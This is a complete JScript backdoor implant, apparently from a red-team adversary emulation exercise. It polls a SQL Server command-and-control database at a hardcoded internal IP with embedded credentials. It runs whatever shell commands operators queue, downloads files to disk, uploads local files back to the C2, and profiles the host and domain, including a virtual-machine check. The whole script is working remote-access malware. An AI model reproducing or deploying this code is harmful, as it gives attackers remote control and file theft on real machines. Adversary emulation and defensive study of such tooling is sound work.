// sleep causes the program to pause for a period specificed by sleepInterval
function sleep(){
    min = 1;
    max = 3;
    jitter = Math.round(Math.random()*(max-min)+min);
    sleepInterval = 500*3*jitter;
    //WScript.Echo(sleepInterval);
    WScript.Sleep(sleepInterval);
}

// lists running processes on host
function listRunningProcesses(){
    var output = "";
    var root = GetObject("winmgmts:");
    var colItems = root.ExecQuery("select * from Win32_Process");
    var enumItems = new Enumerator(colItems);
    for (; !enumItems.atEnd(); enumItems.moveNext()){
        var objItem = enumItems.item();
        output += "\n" + objItem.Name;
    }
    return output;
}

// lists net shares in domain
function netShareDiscovery(){
    var shell = WScript.CreateObject("WScript.Shell");
    try{
      var shellExecObj = shell.exec("cmd.exe /c net view /domain hospitality.local 2>&1");
      var output = shellExecObj.StdOut.ReadAll();
    } catch(e) {
      var output = "Error: " + e;
    }
  
    return output;
  }

// returns whether or not running in a VM
function isVm(){
    var root = GetObject("winmgmts:");
    var biosRequest = root.ExecQuery("Select * From Win32_BIOS");
    var biosItems = new Enumerator(biosRequest);

    for (; !biosItems.atEnd(); biosItems.moveNext()){
        var bios_version = biosItems.item().SMBIOSBIOSVersion.toLowerCase();
        var serial_number = biosItems.item().SerialNumber.toLowerCase();
        if(serial_number.indexOf('parallels') >= 0 || serial_number.indexOf('vmware') >= 0) {
        return true;
        }

        if(bios_version.indexOf('vmware') >= 0 || bios_version.indexOf('virtualbox') >= 0) {
        return true;
        }
    }

    return false;
}

// gets AD info
function getADInformation(){
    try {
        var adobj = new ActiveXObject('ADSystemInfo');
        return adobj.ComputerName;
    } catch(e) {
        return false;
    }
}

// gets environment vars
function getEnvVar(name){
    var shell = WScript.CreateObject("WScript.Shell");
    return shell.ExpandEnvironmentStrings(name);
}

// enumerates system info
function getSysInfo(){
    var result = [];
    var root = GetObject("winmgmts:");
    try{
        result.push('username***' + getEnvVar('%USERNAME%'));
        result.push('hostname***' + getEnvVar('%COMPUTERNAME%'));
        var ad = getADInformation();
        if(ad){
        result.push('adinformation***' + ad);
        } else {
        result.push('adinformation***no_ad');
        }

        var csRequest = root.ExecQuery('Select * From Win32_ComputerSystem');
        var csItems = new Enumerator(csRequest);

        for(; !csItems.atEnd(); csItems.moveNext()) {
        if(csItems.item().PartOfDomain){
            result.push('part_of_domain***yes');
        } else {
            result.push('part_of_domain***no');
        }
        result.push('pc_domain***' + csItems.item().Domain);
        result.push('pc_dns_host_name***' + csItems.item().DNSHostName);
        result.push('pc_model***' + csItems.item().Model);
        }
    } catch (e){
        result.push('error0***code_error');
    }

    try{
        var osRequest = root.ExecQuery('Select * From Win32_OperatingSystem');
        var osItems = new Enumerator(osRequest);

        for(; !osItems.atEnd(); osItems.moveNext()) {
            if(osItems.item().OSArchitecture){
                result.push('os_architecture***' + osItems.item().OSArchitecture);
            }

            if(osItems.item().Version){
                result.push('os_version***' + osItems.item().Version);
            }
        }

    } catch (e){
        result.push('error1***code_error');
    }

    return(result);
}

// full function to discover sys info
function getSysInfoDiscovery(){
    output = "is_vm: " + isVm() + "\n";
    output += getSysInfo();
    return output;
}

// gets MAC address and serial number of disk
function getMacSerial(){
    var root = GetObject("winmgmts:");
    var mac = root.ExecQuery("Select * From Win32_NetworkAdapterConfiguration Where IPEnabled = True");
    var mac_address = "",
        serial = "";
    
    for (var items = new Enumerator(mac); !items.atEnd(); items.moveNext()) {
      var item = items.item();
      if (typeof item.MACAddress == "string"){
        mac_address = item.MACAddress.replace(/:/g, '');
        break;
      }
    }
  
    var lc = root.ExecQuery("Select * from Win32_LogicalDisk");
    for (var items = new Enumerator(lc); !items.atEnd(); items.moveNext()) {
      var item = items.item();
      if (typeof item.VolumeSerialNumber == "string"){
        serial = item.VolumeSerialNumber;
        break;
      }
    }
  
    var ret = mac_address + serial;
    ret = ret.substr(0, 21);
    return(ret);
  }
  
// getRandomFile generates an absolute path to a random file in the user temp directory; no files are created in this function
function getRandomFile(){
    var fileObject = new ActiveXObject("Scripting.FileSystemObject");
    randomFile = fileObject.GetSpecialFolder(2) + "\\" + fileObject.GetTempName();
    return randomFile;
}

// getCommandOutput reads the random file containing command line output
function getCommandOutput(randomFile){
    var fileObject = new ActiveXObject("Scripting.FileSystemObject");
    fileOutput = fileObject.OpenTextFile(randomFile);
    cmdOutput = fileOutput.ReadAll();
    fileOutput.Close();
    fileObject.DeleteFile(randomFile);
    return cmdOutput;
}

// sendTaskOutput sends task output to the red team C2 server via Responses table in DB
function sendTaskOutput(dbo, output, idStr){
    var responseCmd = new ActiveXObject("ADODB.Command");
    responseCmd.CommandText = "INSERT INTO Responses (response, request_id) VALUES (?, " + idStr + ")";
    responseCmd.Parameters.Append(responseCmd.CreateParameter("Command", 129, 1, output.length + 1, output));
    responseCmd.ActiveConnection = dbo;
    responseCmd.Execute();
}

// downloadFile downloads a specified file from the C2 Server/DB and writes it to disk
function downloadFile(fileDestination, fileBlob) {
    // create Data Stream
    var Stream = WScript.CreateObject('ADODB.Stream');

    // prepare the stream for writing data
    Stream.Open();
    Stream.Type = 1; // adTypeBinary
    Stream.Write(fileBlob);
    Stream.Position = 0;
    
    // create an empty target file; overwrite if file exists
    var File = WScript.CreateObject('Scripting.FileSystemObject');
    if (File.FileExists(fileDestination))
    {
        File.DeleteFile(fileDestination);
    }

    // write downloaded file to disk
    Stream.SaveToFile(fileDestination, 2); // adSaveCreateOverWrite
    Stream.Close();
}

// uploadFile to C2 server by inserting into DB
function uploadFile(dbo, inFile, idStr) {
    // read file
    var inStream = new ActiveXObject("ADODB.Stream")
    var fileObject = new ActiveXObject("Scripting.FileSystemObject");
    var size = (fileObject.getFile(inFile)).size;

    inStream.Type = 1;
    inStream.Open;

    inStream.loadFromFile(inFile);
    var inVariant = inStream.read();
    var adVarBinary = 204;
    var recordSet = new ActiveXObject("ADODB.Recordset");

    recordSet.fields.append("mBinary", adVarBinary, size);
    recordSet.open();
    recordSet.addNew();
    recordSet("mBinary").value = inVariant;
    recordSet.update();

    var filecontentCmd = new ActiveXObject("ADODB.Command");
    filecontentCmd.CommandText = "INSERT INTO Responses (filecontent, request_id) VALUES (?, " + idStr + ")";
    filecontentCmd.Parameters.Append(filecontentCmd.CreateParameter("FileContent", 128, 1, size + 1, recordSet("mBinary").value));
    filecontentCmd.ActiveConnection = dbo;
    filecontentCmd.Execute();
}

// execShellCommand executes taskings specified by red team on the C2 server; command output is redirected to a random file
function execShellCommand(command, randomFile, fileBlob, dbo, idStr){
    hasOutput = true;
    noOutput = false;
    if (command.length == 0){
        return noOutput;
    }

    var shell = new ActiveXObject("WScript.Shell");
    s = command.split(" ");
    if (s[0] == "download") {
        downloadFile(s[1], fileBlob);
        cmdWithRedirect = "%comspec% /C echo '[+] Upload Complete' > " + randomFile + " 2>&1";
        shell.Run(cmdWithRedirect, 0, true);
        return hasOutput;
    } else if (s[0] == "upload"){
        uploadFile(dbo, s[1], idStr);
        return noOutput;
    } else if (s[0] == "enum-system") {
        sysinfo = listRunningProcesses();
        sysinfo += "\n\n";
        sysinfo += netShareDiscovery();
        sysinfo += "\n\n";
        sysinfo += getSysInfoDiscovery();
        var FSO = new ActiveXObject("Scripting.FileSystemObject");
        fileHandle = FSO.OpenTextFile(randomFile, 2, true);
        fileHandle.WriteLine(sysinfo);
        fileHandle.Close();
        return hasOutput;
    } else if (s[0] == "get-mac-serial") {
        sysinfo = getMacSerial();
        var FSO = new ActiveXObject("Scripting.FileSystemObject");
        fileHandle = FSO.OpenTextFile(randomFile, 2, true);
        fileHandle.WriteLine(sysinfo);
        fileHandle.Close();
        return hasOutput;
    } else {
        cmdNoRedirect = "%comspec% /C " + command + " > " + randomFile + " 2>&1";
        cmdCreateFile = "%comspec% /C " + "echo Command executed. > " + randomFile + " 2>&1";
        cmdWithRedirect = "%comspec% /C " + command + " > " + randomFile + " 2>&1";
        if (s[0] == "powershell.exe") {
            shell.Run(cmdCreateFile, 0, true);
            shell.Run(cmdWithRedirect, 0, false);
        }
        else {
            shell.Run(cmdWithRedirect, 0, true);
        }
        return hasOutput;
    }
}

function deleteCmd(id, dbo) {
    cmd = "DELETE FROM Requests WHERE ID = " + id;
    dbo.Execute(cmd);
}

function getTasking(dbo, rst) {
    cmd = "SELECT ID, cmd, filecontent FROM Requests;";
    rst = dbo.Execute(cmd);
    while (!rst.EOF) {
        cmdStr = "" + rst("cmd");
        idStr = "" + rst("id");
        fileBlob = rst("filecontent");
        //WScript.Echo(cmdStr);
        var randomFile = getRandomFile();
        cmdOutput = "";
        try {
            hasOutput = execShellCommand(cmdStr, randomFile, fileBlob, dbo, idStr);
            if (hasOutput == true) {
                cmdOutput = getCommandOutput(randomFile);
                sendTaskOutput(dbo, cmdOutput, idStr);
            }
        }catch (e) {
            //WScript.Echo(e.message);
            deleteCmd(idStr, dbo);
            rst.MoveNext;
            continue;
        }
        deleteCmd(idStr, dbo);
        rst.MoveNext;
    }    
}

function main() {
    var dbo = new ActiveXObject("ADODB.Connection");
    var rst = new ActiveXObject("ADODB.Recordset");
    var constr = 'Provider=SQLOLEDB;Server=10.0.2.5;Database=tempdb;UID=evals_user;PWD=Password1234;';
    try {
        dbo.Open(constr);
    } catch (e) {
        finet = 0
        //WScript.Echo(e.message);
    }
    while(true){
        sleep();
        try {
            command = getTasking(dbo, rst);
        } catch (e) {
            //WScript.Echo(e.message);
            continue;
        }
    }

}

main();